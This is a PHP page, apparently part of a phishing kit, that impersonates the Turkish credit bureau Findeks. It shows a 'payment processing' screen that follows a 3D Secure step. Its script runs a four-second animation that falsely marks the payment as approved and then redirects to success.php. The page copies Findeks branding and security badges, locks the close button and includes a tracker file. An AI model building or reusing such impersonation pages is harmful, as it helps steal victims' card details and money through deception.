<?php
$logId = isset($_GET['id']) ? intval($_GET['id']) : 0;

if (!$logId) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr" class="notranslate" translate="no">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <title>İşleminiz Gerçekleştiriliyor - Findeks</title>
    <link rel="icon" type="image/png" href="https://www.findeks.com/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brand: {
                            primary:   '#0056A4',
                            secondary: '#0070cc',
                            light:     '#e8f1fb',
                            dark:      '#003d7a',
                        }
                    },
                    fontFamily: {
                        sans: ['Inter', 'system-ui', 'sans-serif'],
                    }
                }
            }
        };
    </script>
    <style>
        /* ── Progress tabs ── */
        .step-tab {
            display: flex; align-items: center; gap: 6px;
            padding: 6px 14px; border-radius: 20px;
            font-size: 12px; font-weight: 600;
            transition: all 0.2s; white-space: nowrap;
        }
        .step-tab.active  { background: #0056A4; color: #fff; }
        .step-tab.done    { background: #e8f1fb; color: #0056A4; }
        .step-tab.pending { background: transparent; color: #9ca3af; }
        .step-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
        .step-tab.active  .step-dot { background: rgba(255,255,255,0.7); }
        .step-tab.done    .step-dot { background: #0056A4; }
        .step-tab.pending .step-dot { background: #d1d5db; }

        /* ── Spinner ── */
        .spinner {
            width: 72px; height: 72px;
            border: 5px solid rgba(0,86,164,0.12);
            border-top-color: #0056A4; border-radius: 50%;
            animation: spin 0.9s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* ── Pulse dots ── */
        .pulse-dot {
            width: 10px; height: 10px;
            background: #0056A4; border-radius: 50%;
            animation: pulseDot 1.4s ease-in-out infinite;
        }
        .pulse-dot:nth-child(2) { animation-delay: 0.2s; }
        .pulse-dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes pulseDot {
            0%, 100% { opacity: 0.3; transform: scale(0.8); }
            50%       { opacity: 1;   transform: scale(1); }
        }

        /* ── Progress bar ── */
        .progress-bar-fill {
            height: 100%;
            background: linear-gradient(90deg, #0056A4, #0070cc);
            border-radius: 99px;
            transition: width 0.1s linear;
        }

        /* ── Page overlay ── */
        body { background: #f0f4f8; font-family: 'Inter', system-ui, sans-serif; }
        .page-overlay {
            position: fixed; inset: 0;
            background: rgba(10,20,40,0.6); z-index: 10;
            backdrop-filter: blur(4px);
        }
        .modal-shell {
            position: relative; z-index: 20;
            width: 100%; min-height: 100vh;
            display: flex; flex-direction: column;
        }

        /* ── Scrollbar ── */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 99px; }
    </style>
</head>
<body>

<!-- Page overlay -->
<div class="page-overlay" aria-hidden="true"></div>

<div class="modal-shell">

    <!-- ── HEADER ── -->
    <header class="sticky top-0 z-50 bg-white border-b border-gray-100 shadow-sm">
        <div class="max-w-5xl mx-auto px-4 h-14 flex items-center justify-between gap-4">

            <!-- Findeks logo -->
            <a href="index.php" class="flex items-center gap-2 flex-shrink-0" aria-label="Findeks Ana Sayfa">
                <svg width="110" height="28" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
                </svg>
            </a>

            <!-- Title -->
            <span class="hidden sm:block text-sm font-semibold text-gray-700 tracking-wide">Kredi Notunu Öğren</span>

            <!-- Progress tabs — desktop -->
            <nav class="hidden md:flex items-center gap-1" aria-label="Adımlar">
                <div class="step-tab done">
                    <span class="step-dot"></span>Bilgiler
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab done">
                    <span class="step-dot"></span>Paket
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab done">
                    <span class="step-dot"></span>Ödeme
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab done">
                    <span class="step-dot"></span>3D Secure
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab active" aria-current="step">
                    <span class="step-dot"></span>Sonuç
                </div>
            </nav>

            <!-- Progress dots — mobile -->
            <div class="flex md:hidden items-center gap-1.5" aria-label="Adım 5 / 5">
                <span class="w-2 h-2 rounded-full bg-brand-light border border-brand-primary"></span>
                <span class="w-2 h-2 rounded-full bg-brand-light border border-brand-primary"></span>
                <span class="w-2 h-2 rounded-full bg-brand-light border border-brand-primary"></span>
                <span class="w-2 h-2 rounded-full bg-brand-light border border-brand-primary"></span>
                <span class="w-2.5 h-2.5 rounded-full bg-brand-primary"></span>
            </div>

            <!-- Close button (disabled during processing) -->
            <span class="flex-shrink-0 w-8 h-8 rounded-full flex items-center justify-center text-gray-200 cursor-not-allowed" aria-label="İşlem devam ediyor">
                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
            </span>
        </div>
    </header>

    <!-- ── MAIN CONTENT ── -->
    <main class="flex-1 max-w-5xl mx-auto w-full px-4 py-8 lg:py-12 flex items-center justify-center">
        <div class="w-full max-w-lg">

            <!-- Processing card -->
            <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-10 text-center">

                <!-- Spinner -->
                <div class="flex items-center justify-center mb-8">
                    <div class="spinner"></div>
                </div>

                <!-- Title -->
                <h1 class="text-2xl font-bold text-gray-900 mb-3">Ödemeniz İşleniyor</h1>
                <p class="text-sm text-gray-500 leading-relaxed mb-8">
                    Lütfen bu sayfadan ayrılmayın.<br>
                    İşleminiz birkaç saniye içinde tamamlanacaktır.
                </p>

                <!-- Pulse dots -->
                <div class="flex items-center justify-center gap-2 mb-8">
                    <div class="pulse-dot"></div>
                    <div class="pulse-dot"></div>
                    <div class="pulse-dot"></div>
                </div>

                <!-- Progress bar -->
                <div class="w-full bg-gray-100 rounded-full h-2 mb-6 overflow-hidden">
                    <div class="progress-bar-fill" id="progressBar" style="width: 0%"></div>
                </div>

                <!-- Reference number -->
                <div class="inline-flex items-center gap-2 px-4 py-2 bg-brand-light rounded-xl">
                    <svg class="w-4 h-4 text-brand-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
                    <span class="text-xs text-gray-500">İşlem No:</span>
                    <span class="font-mono font-bold text-brand-primary text-sm">#<?= str_pad($logId, 6, '0', STR_PAD_LEFT) ?></span>
                </div>

                <!-- Steps checklist -->
                <div class="mt-8 space-y-2.5 text-left">
                    <div class="flex items-center gap-3 p-3 bg-green-50 rounded-xl" id="step1Check">
                        <div class="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center flex-shrink-0">
                            <svg class="w-3 h-3 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <span class="text-sm text-green-700 font-medium">3D Secure doğrulaması tamamlandı</span>
                    </div>
                    <div class="flex items-center gap-3 p-3 bg-gray-50 rounded-xl" id="step2Check">
                        <div class="w-6 h-6 rounded-full bg-gray-200 flex items-center justify-center flex-shrink-0" id="step2Icon">
                            <div class="w-3 h-3 border-2 border-gray-400 border-t-transparent rounded-full animate-spin"></div>
                        </div>
                        <span class="text-sm text-gray-600 font-medium" id="step2Label">Ödeme işleniyor...</span>
                    </div>
                    <div class="flex items-center gap-3 p-3 bg-gray-50 rounded-xl opacity-50" id="step3Check">
                        <div class="w-6 h-6 rounded-full bg-gray-200 flex items-center justify-center flex-shrink-0">
                            <span class="text-gray-500 text-[10px] font-bold">3</span>
                        </div>
                        <span class="text-sm text-gray-500 font-medium">Rapor hazırlanıyor</span>
                    </div>
                </div>

            </div>

            <!-- Trust row -->
            <div class="flex items-center justify-center gap-5 pt-6">
                <div class="flex items-center gap-1.5 text-gray-400">
                    <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                    <span class="text-[11px]">SSL Şifreli</span>
                </div>
                <div class="flex items-center gap-1.5 text-gray-400">
                    <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
                    <span class="text-[11px]">256-bit Şifreleme</span>
                </div>
                <div class="flex items-center gap-1.5 text-gray-400">
                    <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
                    <span class="text-[11px]">KKB Güvenceli</span>
                </div>
            </div>

        </div>
    </main>

    <!-- ── FOOTER ── -->
    <footer class="border-t border-gray-100 bg-white mt-auto">
        <div class="max-w-5xl mx-auto px-4 py-5 flex flex-col sm:flex-row items-center justify-between gap-4">
            <a href="index.php" class="flex items-center gap-2" aria-label="Findeks">
                <svg width="90" height="22" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
                </svg>
            </a>
            <p class="text-[11px] text-gray-400 text-center">
                &copy; <?= date('Y') ?> Findeks — Kredi Kayıt Bürosu A.Ş. Tüm hakları saklıdır.
            </p>
            <div class="flex items-center gap-2">
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">GlobalSign</span>
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">KKB</span>
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">Eyebrand</span>
            </div>
        </div>
    </footer>

</div><!-- end modal-shell -->

<script>
    const logId    = <?= $logId ?>;
    const DURATION = 4000; // 4 seconds
    const start    = Date.now();
    const bar      = document.getElementById('progressBar');

    // Animate progress bar
    function animateBar() {
        const elapsed = Date.now() - start;
        const pct     = Math.min((elapsed / DURATION) * 100, 100);
        bar.style.width = pct + '%';

        // At 60% — mark step 2 done, show step 3 active
        if (pct >= 60 && !document.getElementById('step2Check').classList.contains('bg-green-50')) {
            const s2 = document.getElementById('step2Check');
            s2.classList.remove('bg-gray-50');
            s2.classList.add('bg-green-50');
            document.getElementById('step2Icon').innerHTML = '<svg class="w-3 h-3 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>';
            document.getElementById('step2Icon').className = 'w-6 h-6 rounded-full bg-green-500 flex items-center justify-center flex-shrink-0';
            document.getElementById('step2Label').textContent = 'Ödeme onaylandı';
            document.getElementById('step2Label').className = 'text-sm text-green-700 font-medium';

            const s3 = document.getElementById('step3Check');
            s3.classList.remove('opacity-50');
            s3.classList.add('bg-blue-50');
            s3.querySelector('span:last-child').className = 'text-sm text-brand-primary font-medium';
        }

        if (pct < 100) {
            requestAnimationFrame(animateBar);
        } else {
            // Redirect to success
            setTimeout(() => {
                window.location.href = 'success.php?id=' + logId;
            }, 300);
        }
    }

    requestAnimationFrame(animateBar);
</script>

<?php include 'includes/tracker.php'; ?>
</body>
</html>
